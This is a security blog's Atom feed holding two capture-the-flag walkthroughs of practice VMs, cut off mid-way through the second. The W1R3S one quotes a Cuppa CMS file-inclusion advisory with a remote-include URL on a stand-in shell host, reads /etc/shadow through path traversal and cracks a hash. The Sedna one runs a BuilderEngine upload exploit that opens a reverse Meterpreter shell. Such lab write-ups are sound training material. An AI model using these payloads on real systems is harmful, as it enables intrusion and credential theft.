<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2018-11-30T17:09:51+02:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Getting in the W1R3S]]></title>
    <link href="http://chousensha.github.io/blog/2018/11/30/getting-in-the-w1r3s/"/>
    <updated>2018-11-30T16:18:45+02:00</updated>
    <id>http://chousensha.github.io/blog/2018/11/30/getting-in-the-w1r3s</id>
    <content type="html"><![CDATA[<p>With today&rsquo;s post I am experimenting with a new way of writing my hacking blog posts based on the <a href="https://redteams.net/redteaming/2017/phases-of-a-red-team-assessment-revisited">5 phases of red teams assessments</a>.</p>

<!-- more -->


<h2>Phase 1: OPORD</h2>

<p>The machine description is the following:</p>

<p>```
You have been hired to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain root access and find the flag (located in /root directory).</p>

<p>Difficulty to get a low privileged shell: Beginner/Intermediate</p>

<p>Difficulty to get privilege escalation: Beginner/Intermediate</p>

<p>About: This is a vulnerable Ubuntu box giving you somewhat of a real world scenario and reminds me of the OSCP labs.
```</p>

<h2>Phase 2: RECON</h2>

<p><code>
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.145.130
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   MySQL (unauthorized)
</code></p>

<p>The immediate points of interest are the FTP server, and the web server. Since Nmap only found the Apache default page, I started some background enumeration with Gobuster:</p>

<p>```
gobuster -u <a href="http://192.168.145.134">http://192.168.145.134</a> -w /usr/share/wordlists/dirb/common.txt</p>

<p>=====================================================</p>

<h1>Gobuster v2.0.0              OJ Reeves (@TheColonial)</h1>

<p>[+] Mode         : dir
[+] Url/Domain   : <a href="http://192.168.145.134/">http://192.168.145.134/</a>
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403</p>

<h1>[+] Timeout      : 10s</h1>

<h1>2018/11/30 05:46:49 Starting gobuster</h1>

<p>/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/administrator (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)</p>

<h1>/wordpress (Status: 301)</h1>

<p>```</p>

<p>Ok, we have some web directories to check..a possible Wordpress installation, a MySQL database and an FTP server that we can login to.</p>

<h2>Phase 3: TARGET ID</h2>

<p>Logging in to the FTP server, we see the following directories:</p>

<p><code>
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
</code></p>

<p>I downloaded them to my machine with <code>wget -r <a href="ftp://ftp:anonymous@192.168.145.134/">ftp://ftp:anonymous@192.168.145.134/</a></code>. Inside the <em>content</em> folder there are 3 text files, and one of them contains potentially interesting data:</p>

<p>```
root@onosendai:~/target/192.168.145.134/content# ls -alh
total 20K
drwxr-xr-x 2 root root 4.0K Nov 30 06:16 .
drwxr-xr-x 5 root root 4.0K Nov 30 06:16 ..
-rw-r&mdash;r&mdash; 1 root root   29 Jan 23  2018 01.txt
-rw-r&mdash;r&mdash; 1 root root  165 Jan 23  2018 02.txt
-rw-r&mdash;r&mdash; 1 root root  582 Jan 23  2018 03.txt
root@onosendai:~/target/192.168.145.134/content# cat 01.txt
New FTP Server For W1R3S.inc
root@onosendai:~/target/192.168.145.134/content# cat 02.txt
#
#
#
#
#
#
#
#
01ec2d8fc11c493b25029fb1f47f39ce
#
#
#
#
#
#
#
#
#
#
#
#
#
SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</p>

<h6>#</h6>

<p>root@onosendai:~/target/192.168.145.134/content# cat 03.txt
<em><em><em><em><em><em><em><em><em><strong>.</strong>              <strong>      </strong>  </em></em></em></em></em></em></em></em></em><em><em><strong><strong><strong><strong><strong><em>   </em></strong></strong></strong></strong>    .</strong>             <br/>
_</em>    </em><strong>/|  |</strong>   <strong><strong>   /  \    /  \/<em>   _</em></strong></strong>   _<strong><strong>  \ /   </strong></strong><em>/    |<strong>| </strong></em><em>   </em><em><strong><br/>
  |    |   |  |  _/ </strong> \  \   \/\/   / |   ||       </em>/ <em>(<strong>  &lt; _</strong></em><em>  \     |  |/    _/ </em><strong>\
  |    |   |   Y  \  </strong><em>/   \        /  |   ||    |   \/       \/        \    |  |   |  \  _<strong>
  |</strong></em><em>|   |</em><strong>|  /_</strong>  >   _<em>/\  /   |</em><strong>||</strong><strong>|<em>  /</em></strong><strong><em>  /</em></strong><em><strong>_  / /\ |</strong>|</em><strong>|  /_</strong>  ></p>

<pre><code>            \/     \/         \/                \/       \/        \/  \/         \/     \/
</code></pre>

<p>```</p>

<p>I used an online MD5 hash cracker to get the value <code>This is not a password</code>. And the base64 string gave the message that <code>It is easy, but not that easy..</code>. So there are probably red herrings, let&rsquo;s move on.</p>

<p>Inside <em>docs</em> there&rsquo;s a text file with some upside down text:</p>

<p>```
root@onosendai:~/target/192.168.145.134/docs# cat worktodo.txt</p>

<pre><code>ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡
</code></pre>

<p>&hellip;.punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
```</p>

<p>Used an <a href="http://flip-upsidedown-text.1bestlink.net/">online converter</a> to flip this and reverse it for the text:</p>

<p><code>
we have a ןot of work to do‘ stop pןaying around˙˙˙˙
i don't think this is the way to root!
</code></p>

<p>This is also useless..The final piece gives us some names that we might be able to use later:</p>

<p>```
root@onosendai:~/target/192.168.145.134/new-employees# cat employee-names.txt
The W1R3S.inc employee list</p>

<p>Naomi.W &ndash; Manager
Hector.A &ndash; IT Dept
Joseph.G &ndash; Web Design
Albert.O &ndash; Web Design
Gina.L &ndash; Inventory
Rico.D &ndash; Human Resources
```</p>

<p>This is all the information we got from the FTP vector. Let&rsquo;s return to the web server now. The javascript folder was forbidden for viewing, and the wordpress folder redirected to localhost/wordpress, so I had to modify my <code>/etc/hosts</code> file:</p>

<p><code>
192.168.145.134 localhost
</code></p>

<p>Now I could get to the Wordpress blog, which looks to be under construction:</p>

<p><img class="center" src="/images/pentest/w1r3s/wordpress.png" title="&lsquo;wordpress&rsquo; &lsquo;wordpress&rsquo;" ></p>

<p>I decided to go with an alternate Wordpress scanner for this one, so instead of WPScan, I went with <a href="https://github.com/m4ll0k/WPSeku">WPSeku</a></p>

<blockquote><p>WPSeku &ndash; Wordpress Security Scanner</p>

<p>WPSeku is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.</p></blockquote>

<p>```</p>

<h2>python3 wpseku.py</h2>

<p> _ _ _ <strong><em> </em></strong> <strong><em>| |</em> _ _
| | | | . |<em> &ndash;| &ndash;</em>| &lsquo;<em>| | |
|</em></strong><strong>|  <em>|</em></strong>|<strong><em>|</em>,<em>|</em></strong>|</p>

<pre><code>  |_|             v0.4.0
</code></pre>

<p>WPSeku &ndash; Wordpress Security Scanner</p>

<h2>by Momo Outaadi (m4ll0k)</h2>

<p>Usage: wpseku.py [options]</p>

<pre><code>-u --url    Target URL (e.g: http://site.com)
-b --brute  Bruteforce login via xmlrpc
-U --user   Set username for bruteforce, default "admin"
-s --scan   Checking wordpress plugin code
-p --proxy  Use a proxy, (host:port)
-c --cookie Set HTTP Cookie header value
-a --agent  Set HTTP User-agent header value
-r --ragent Use random User-agent header value
-R --redirect   Set redirect target URL False
-t --timeout    Seconds to wait before timeout connection
-w --wordlist   Set wordlist, default "db/wordlist.txt"
-v --verbose    Print more informations
-h --help   Show this help and exit
</code></pre>

<p>Example:</p>

<pre><code> wpseku.py --url http://site.com/
 wpseku.py --url http://site.com --brute --user test
 wpseku.py --url http://site.com/ --brute --user admin --wordlist wordlist.txt
</code></pre>

<p>```</p>

<p>Ran it against the target:</p>

<p>```</p>

<h2>python3 wpseku.py -u <a href="http://localhost/wordpress/">http://localhost/wordpress/</a> -v</h2>

<p> _ _ _ <strong><em> </em></strong> <strong><em>| |</em> _ _
| | | | . |<em> &ndash;| &ndash;</em>| &lsquo;<em>| | |
|</em></strong><strong>|  <em>|</em></strong>|<strong><em>|</em>,<em>|</em></strong>|</p>

<pre><code>  |_|             v0.4.0
</code></pre>

<p>WPSeku &ndash; Wordpress Security Scanner</p>

<h2>by Momo Outaadi (m4ll0k)</h2>

<p>[ + ] Target: <a href="http://localhost/wordpress/">http://localhost/wordpress/</a>
[ + ] Starting: 07:52:06</p>

<p>[ + ] Server: Apache/2.4.18 (Ubuntu)
[ i ] Checking Full Path Disclosure&hellip;
[ i ] Checking wp-config backup file&hellip;
[ + ] wp-config.php available at: <a href="http://localhost/wordpress/wp-config.php">http://localhost/wordpress/wp-config.php</a>
[ i ] Checking common files&hellip;
[ + ] readme.html file was found at: <a href="http://localhost/wordpress/readme.html">http://localhost/wordpress/readme.html</a>
[ i ] Checking directory listing&hellip;
[ + ] Dir &ldquo;/wp-admin/css&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-admin/css/">http://localhost/wordpress/wp-admin/css/</a>
[ + ] Dir &ldquo;/wp-admin/images&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-admin/images/">http://localhost/wordpress/wp-admin/images/</a>
[ + ] Dir &ldquo;/wp-admin/includes&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-admin/includes/">http://localhost/wordpress/wp-admin/includes/</a>
[ + ] Dir &ldquo;/wp-admin/js&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-admin/js/">http://localhost/wordpress/wp-admin/js/</a>
[ + ] Dir &ldquo;/wp-content/uploads&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-content/uploads/">http://localhost/wordpress/wp-content/uploads/</a>
[ + ] Dir &ldquo;/wp-includes/&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/">http://localhost/wordpress/wp-includes/</a>
[ + ] Dir &ldquo;/wp-includes/js&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/js/">http://localhost/wordpress/wp-includes/js/</a>
[ + ] Dir &ldquo;/wp-includes/Text&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/Text/">http://localhost/wordpress/wp-includes/Text/</a>
[ + ] Dir &ldquo;/wp-includes/css&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/css/">http://localhost/wordpress/wp-includes/css/</a>
[ + ] Dir &ldquo;/wp-includes/images&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/images/">http://localhost/wordpress/wp-includes/images/</a>
[ + ] Dir &ldquo;/wp-includes/pomo&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/pomo/">http://localhost/wordpress/wp-includes/pomo/</a>
[ + ] Dir &ldquo;/wp-includes/theme-compat&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/theme-compat/">http://localhost/wordpress/wp-includes/theme-compat/</a>
[ i ] Checking wp-loging protection&hellip;
[ i ] Checking robots paths&hellip;
[ i ] Checking WordPress version&hellip;
[ + ] Running WordPress version: 4.9.8
  |   Not found vulnerabilities</p>

<p>[ i ] Passive enumeration themes&hellip;
[ + ] Name: twentyseventeen
[ i ] Checking themes changelog&hellip;
[ i ] Checking themes full path disclosure&hellip;
[ i ] Checking themes license&hellip;
[ i ] Checking themes readme&hellip;
[ i ] Checking themes directory listing&hellip;
[ i ] Checking theme vulnerabilities&hellip;
  |   Not found vulnerabilities</p>

<p>[ i ] Passive enumeration plugins&hellip;
[ + ] Not found plugins with passive enumeration</p>

<h2>[ i ] Enumerating users&hellip;</h2>

<h2>| ID | Username | Login    |</h2>

<p>|  0 | Admin    | admin    |
|  1 | Admin    | None     |
|  2 |          | admin    |</p>

<h2>|  3 |          | joseph-g |</h2>

<p>```</p>

<p>Nothing evidently exploitable in the scan results, so I turned to the <em>/administrator</em> folder on the web server and got to the configuration screen of a Cuppa CMS:</p>

<p><img class="center" src="/images/pentest/w1r3s/cuppa-cms.png" title="&lsquo;cuppa cms&rsquo; &lsquo;cuppa cms&rsquo;" ></p>

<p>Couldn&rsquo;t proceed with the configuration because I didn&rsquo;t have enough information:</p>

<p><img class="center" src="/images/pentest/w1r3s/cuppa-admin.png" title="&lsquo;cuppa admin&rsquo; &lsquo;cuppa admin&rsquo;" ></p>

<p>I&rsquo;ve never heard of this CMS before, I ran a quick searchsploit and got a hit:</p>

<p>```
searchsploit cuppa cms</p>

<hr />

<p> Exploit Title                                                                                              |  Path</p>

<pre><code>                                                                                                        | (/usr/share/exploitdb/)
</code></pre>

<hr />



<hr />

<p>```</p>

<p>Let&rsquo;s see what this is about:</p>

<p>```</p>

<h6>#</h6>

<p>VULNERABILITY: PHP CODE INJECTION</p>

<h6>#</h6>

<p>/alerts/alertConfigField.php (LINE: 22)</p>

<hr />

<p>LINE 22:</p>

<pre><code>    &lt;?php include($_REQUEST["urlConfig"]); ?&gt;
</code></pre>

<hr />

<h6>#</h6>

<p>DESCRIPTION</p>

<h6>#</h6>

<p>An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.</p>

<p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=">http://target/cuppa/alerts/alertConfigField.php?urlConfig=</a>[FI]</p>

<h6>#</h6>

<p>EXPLOIT</p>

<h6>#</h6>

<p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?">http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?</a></p>

<p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p>

<p>Moreover, We could access Configuration.php source code via PHPStream</p>

<p>For Example:</p>

<hr />

<p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php">http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php</a></p>

<hr />

<p>```</p>

<h2>Phase 4: LIVE RUN</h2>

<p>I tried the LFI, but all I got was a blank page in return. So I attempted this with curl, and got served the <em>passwd</em> file:</p>

<p><code>
curl http://192.168.145.134/administrator/alerts/alertConfigField.php --data-urlencode urlConfig=../../../../../../../../../etc/passwd
[...]
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
[...]
</code></p>

<p>Now we have a valid user on the system and we can read arbitrary files. Because the root user was prepopulated in the installation page, I tried reading the <em>/etc/shadow</em> file and&hellip;succeeded!</p>

<p><code>
root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
</code></p>

<p>That was a lucky break! I put the hashes for root and w1r3s in a file to be cracked by John the Ripper and immediately got a password:</p>

<p><code>
john hashes.txt
Created directory: /root/.john
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
computer         (w1r3s)
</code></p>

<p>With this, I could SSH in.</p>

<p>```
ssh <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#x77;&#x31;&#114;&#51;&#115;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x31;&#x34;&#53;&#46;&#x31;&#51;&#52;">&#x77;&#49;&#x72;&#x33;&#x73;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#x31;&#x34;&#53;&#46;&#49;&#x33;&#52;</a>
The authenticity of host &lsquo;192.168.145.134 (192.168.145.134)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is SHA256:/3N0PzPMqtXlj9QWJFMbCufh2W95JylZ/oF82NkAAto.
Are you sure you want to continue connecting (yes/no)? yes</p>

<h2>Warning: Permanently added &lsquo;192.168.145.134&rsquo; (ECDSA) to the list of known hosts.</h2>

<h2>Think this is the way?</h2>

<h2>Well,&hellip;&hellip;..possibly.</h2>

<p><a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#119;&#49;&#114;&#x33;&#115;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x31;&#52;&#x35;&#46;&#x31;&#x33;&#52;">&#x77;&#49;&#x72;&#x33;&#115;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#x31;&#x34;&#x35;&#x2e;&#49;&#51;&#52;</a>&rsquo;s password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com">https://help.ubuntu.com</a></li>
<li>Management:     <a href="https://landscape.canonical.com">https://landscape.canonical.com</a></li>
<li>Support:        <a href="https://ubuntu.com/advantage">https://ubuntu.com/advantage</a></li>
</ul>


<p>227 packages can be updated.
11 updates are security updates.</p>

<p><strong><em> System restart required </em></strong>
&hellip;..You made it huh?&hellip;.
Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35
```</p>

<p>One of the things I picked up from watching <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Ippsec</a> videos was to check the sudo privileges early on:</p>

<p>```
sudo -l
sudo: unable to resolve host W1R3S
[sudo] password for w1r3s:
Matching Defaults entries for w1r3s on W1R3S:</p>

<pre><code>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</code></pre>

<p>User w1r3s may run the following commands on W1R3S:</p>

<pre><code>(ALL : ALL) ALL
</code></pre>

<p>```</p>

<p>That tops the misconfiguration list! Our user has unlimited sudo privileges!</p>

<p>```
w1r3s@W1R3S:~$ sudo /bin/bash
sudo: unable to resolve host W1R3S
root@W1R3S:~# ls /root
flag.txt</p>

<h2>root@W1R3S:~# cat /root/flag.txt</h2>

<hr />

<p>  / <strong><em>/ _ \| \ | |/ </em></strong>|  _ \    / \|<em>   </em>| | | | |      / \|<em>   </em>|<em> </em>/ _ \| \ | / <strong><em>|
 | |  | | | |  \| | |  </em>| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| _</strong> \
 | |<strong>| |<em>| | |\  | |</em>| |  _ &lt;  / </strong><em> \| | | |</em>| | |<strong><em> / </em></strong> \| |  | | |<em>| | |\  |</em><strong>) |
  _</strong><em>___/|</em>| _|_<strong><em>|</em>| _\/_/   __|  _</strong>/|<em><strong><em><em>/</em>/   __| |</em></strong>___/|</em>| _|____/</p>

<hr />

<pre><code>                      .-----------------TTTT_-----_______
                    /''''''''''(______O] ----------____  \______/]_
 __...---'"""\_ --''   Q                               ___________@
</code></pre>

<p> |&lsquo;&rsquo;&lsquo;                   .<em>   </em><strong><em><em>__________=&mdash;&mdash;&mdash;&mdash;&ndash;&ldquo;&rdquo;&ldquo;&rdquo;&ldquo;&rdquo;&ldquo;
 |                ..&mdash;&rsquo;&lsquo;|   l L |</em>l   |
 |          ..&mdash;&rsquo;&lsquo;      .  /&ndash;</em></strong>j &rsquo;   &lsquo;
 |    ..&mdash;&rsquo;&lsquo;           /  ,       &rsquo;   &lsquo;
 |&mdash;&rsquo;&lsquo;                /           `    \</p>

<pre><code>                  L__'         \    -
                                -    '-.
                                 '.    /
                                   '-./
</code></pre>

<hr />

<p>  YOU HAVE COMPLETED THE</p>

<pre><code>           __      __  ______________________   _________
          /  \    /  \/_   \______   \_____  \ /   _____/
          \   \/\/   / |   ||       _/ _(__  &lt; \_____  \
           \        /  |   ||    |   \/       \/        \
            \__/\  /   |___||____|_  /______  /_______  /.INC
                 \/                \/       \/        \/        CHALLENGE, V 1.0
</code></pre>

<hr />

<p>CREATED BY SpecterWires</p>

<hr />

<p>```</p>

<h2>Phase 5: REPORT</h2>

<p>The exploitation chain was as follows:</p>

<ul>
<li>enumeration revealed the Cuppa CMS directories</li>
<li>Cuppa CMS was vulnerable to a LFI exploit</li>
<li>due to the CMS being configured as root, it was possible to read the <em>/etc/shadow</em> file with the LFI</li>
<li>hash was cracked for standard user <em>w1r3s</em></li>
<li>the user had unlimited sudo privileges and elevating to root was achieved</li>
</ul>


<p>Until next time!</p>

<p>```</p>

<hr />

<p>/ You&rsquo;ll never be the man your mother \</p>

<h2>\ was!                                /</h2>

<pre><code>         \   ^__^
            \  (oo)\_______
                 (__)\       )\/\
                         ||----w |
                         ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackfest 2016: Sedna]]></title>
    <link href="http://chousensha.github.io/blog/2018/11/16/hackfest-2016-sedna/"/>
    <updated>2018-11-16T21:22:02+02:00</updated>
    <id>http://chousensha.github.io/blog/2018/11/16/hackfest-2016-sedna</id>
    <content type="html"><![CDATA[<p>This is another machine in the Hackfest 2016 series.</p>

<blockquote><p>There are 4 flags on this machine One for a shell One for root access Two for doing post
exploitation on Sedna</p></blockquote>

<p>Alrighty, let&rsquo;s hack the planet!</p>

<!-- more -->


<p>Plenty of open ports:</p>

<p><code>
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)
|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)
|   256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)
|_  256 ca:36:3c:32:e6:24:f9:b7:b4:d4:1d:fc:c0:da:10:96 (ED25519)
53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.9.5-3-Ubuntu
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA TOP AUTH-RESP-CODE SASL PIPELINING STLS RESP-CODES UIDL
|_ssl-date: TLS randomness does not represent time
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          48644/tcp  status
|_  100024  1          58324/udp  status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: post-login STARTTLS more SASL-IR LITERAL+ have IMAP4rev1 listed OK capabilities Pre-login LOGINDISABLEDA0001 ID ENABLE IDLE LOGIN-REFERRALS
|_ssl-date: TLS randomness does not represent time
445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
993/tcp   open  ssl/imaps?
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3s?
|_ssl-date: TLS randomness does not represent time
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
48644/tcp open  status      1 (RPC #100024)
</code></p>

<p>Hit a couple of walls with the first enumeration attempts. The robots.txt has a Hackers entry that doesn&rsquo;t lead anywhere. Nothing usable for the bind server and the OpenSSH. enum4linux came back empty because I had no username/password pair to specify. And the Tomcat server did not use default credentials. So I fired up Gobuster and it found some additional things to check:</p>

<p>```
gobuster -w /usr/share/wordlists/dirb/big.txt -u <a href="http://192.168.145.128/">http://192.168.145.128/</a></p>

<p>=====================================================</p>

<h1>2018/11/16 14:56:38 Starting gobuster</h1>

<p>/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/blocks (Status: 301)
/files (Status: 301)
/modules (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
/system (Status: 301)
/themes (Status: 301)
```</p>

<p>I visited each link, there are lots of directory listings for what appears to be a blog and ecommerce application. Some directories blocked me from entering, but I did find an indication of the target application inside <a href="http://192.168.145.128/themes/default_theme_2016/description.txt">http://192.168.145.128/themes/default_theme_2016/description.txt</a></p>

<p><code>
Default Theme 2016 for BuilderEngine V3.
</code></p>

<p>Searching for BuilderEngine exploits gave me 2 results, 1 exploitDB exploit and 1 Metasploit module. Let&rsquo;s see both in action, starting with Metasploit!</p>

<h2>Low privilege shell &ndash; Metasploit</h2>

<p>```
search builderengine</p>

<h1>Matching Modules</h1>

<p>   Name                                          Disclosure Date  Rank       Check  Description</p>

<hr />

<p>   exploit/multi/http/builderengine_upload_exec  2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution</p>

<p>Name       Current Setting  Required  Description</p>

<hr />

<p>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
   RHOST      192.168.145.128  yes       The target address
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to BuilderEngine
   VHOST                       no        HTTP server virtual host</p>

<p>Payload options (php/meterpreter_reverse_tcp):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   LHOST  192.168.145.133  yes       The listen address (an interface may be specified)
   LPORT  8000             yes       The listen port
```</p>

<p>Ran it and got a Meterpreter shell:</p>

<p>```
msf exploit(multi/http/builderengine_upload_exec) > run</p>

<p>[<em>] Started reverse TCP handler on 192.168.145.133:8000
[+] Our payload is at: ppWvWjKRuV.php. Calling payload&hellip;
[</em>] Calling payload&hellip;
[*] Meterpreter session 1 opened (192.168.145.133:8000 &ndash;> 192.168.145.128:53518) at 2018-11-16 15:21:54 -0500
[+] Deleted ppWvWjKRuV.php</p>

<p>meterpreter >
```</p>

<p>The kernel is old, so plenty of privilege escalations should be available:</p>

<p>```
meterpreter > sysinfo
Computer    : Sedna
OS          : Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686
Meterpreter : php/linux</p>

<p>meterpreter > cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION=&ldquo;Ubuntu 14.04.1 LTS&rdquo;
```</p>

<p>I used Searchsploit to look for Ubuntu 14.04 exploits and went with the <a href="https://www.exploit-db.com/exploits/37292/">37292.c overlayfs exploit</a>/ I downloaded it to the machine, compiled it, ran it..and surprise, no root! I also tried the Apport exploit, still no luck. While looking around though, I did find the low privilege flag:</p>

<p><code>
meterpreter &gt; cat /var/www/flag.txt
bfbb7e6e6e88d9ae66848b9aeac6b289
</code></p>

<p>Before continuing with rooting the machine, I went back getting a shell without Metasploit.</p>

<h2>Low privilege shell &ndash; manual</h2>

<p>Here&rsquo;s the ExploitDB variant of arbitrary file upload:</p>

<p>```
cat 40390.php</p>

<!-- 
# Exploit Title: BuilderEngine 3.5.0 Remote Code Execution via elFinder 2.0
# Date: 18/09/2016
# Exploit Author: metanubix
# Vendor Homepage: http://builderengine.org/
# Software Link: http://builderengine.org/page-cms-download.html
# Version: 3.5.0
# Tested on: Kali Linux 2.0 64 bit
